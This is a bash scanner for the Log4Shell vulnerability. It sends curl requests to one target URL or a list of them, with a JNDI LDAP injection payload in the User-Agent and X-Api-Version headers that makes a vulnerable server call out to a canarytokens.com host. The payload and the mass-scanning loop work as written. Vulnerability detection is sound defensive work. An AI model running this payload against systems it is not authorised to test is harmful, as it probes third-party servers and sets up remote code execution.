#!/bin/bash 
# Author: Abhijeet Singh (@abhiunix)
# Date: 12 Dec 2021
# Twitter: https://twitter.com/abhiunix
# Sample Payload: ${jndi:ldap://x${hostName}.L4J.05k3mkguoclo1yogn6z1qzjvx.canarytokens.com/a}

payload='${jndi:ldap://x${hostName}.L4J.05k3mkguoclo1yogn6z1qzjvx.canarytokens.com/a}'
echo ""
echo -e "Your Payload: \033[31m$payload\033[m"

payload1='User-Agent: '
payload1+=$payload

payload2='X-Api-Version: '
payload2+=$payload

# payloadNormal(){
# }

function toolsCheck(){
    if [ -x "$(which httpx)" ] ; then
    	echo ""
    else
        echo "Could not find httpx, please install it from here https://github.com/projectdiscovery/httpx" >&2
        echo "If you are on *nix then run this command: go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
        exit
    fi
}

function functionu(){
echo ""
echo -e "Checking for log4j vulnerability on \033[31m$uo\033[m"

null=$(curl -sk $uo -H "$payload1" --connect-timeout 2 -m 5)

null=$(curl -sk $uo -H "$payload2" -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0' --connect-timeout 2 -m 5)

}

function functionl(){
echo ""
while IFS= read -r line; do
	uo=$line
	functionu
done 
}

if (( $# < 1 )); then
     echo "Try using valid options. Use -h to show help menu."
     exit  
fi

toolsCheck

while getopts u:l:hc options; do

		case $options in
				u) uo=$OPTARG;;
				l) lo=$OPTARG;;
				h) ho=$OPTARG;;
				*) echo "Try using valid options. use -h to show help menu.";;

		esac


		if [[ $options = "u" ]]; then
			functionu
			echo -e "\033[31mIf the payload fire-up, you will get the DNS request on your server.\033[m"
			

		elif [[ $options = "l" ]]; then
			echo "Checking if the supplied list of URLs are working fine."
			echo ""
			sleep 1

			urlContent=$(cat $2| grep -E '^(http|https)://')

			if [ -z "$urlContent" ]; then
				#The file is empty. URL is like this google.com. 
				echo -e "\033[31mURLs need to be in correct format. Making it usable with httpx.\033[m"
				cat $2 | httpx --silent | tee $2.urls
				echo ""
				echo "Done Successfully"
			else
				echo "You have provided urls in correct format. So, no change."
				cp $2 $2.urls
			fi

			echo ""
			sleep 1

			numOfURLs=$(cat $2.urls|awk 'END { print NR }')

			echo -e "Nice!! We have collected \033[31m$numOfURLs working urls\033[m  in \033[31m$2.urls\033[m file."
			echo ""
			sleep 2
			echo -e "Now executing \033[31mlog4j payloads\033[m on supplied URLs."
			echo "=================================================================="
			sleep 3
			functionl < $2.urls
			
			echo "Finished!!"
			echo ""
			echo -e "\033[31mIf the payload fire-up, you will get the DNS request on your server.\033[m"

		elif [[ $options = "h" ]]; then
			echo -e "\033[31mUsage:\033[m"
			echo "  -h   Show basic help message and exit"
			echo "  -u   Target URL (e.g. 'http://www.site.com/')"
			echo "  -l   Target URL list file."
			echo ""
			echo "eg: ./log4jTest.sh -u https://example.com"
			echo "eg: ./log4jTest.sh -l ./path/URLlist.txt"
		fi
done
#enhancement
#--cookie support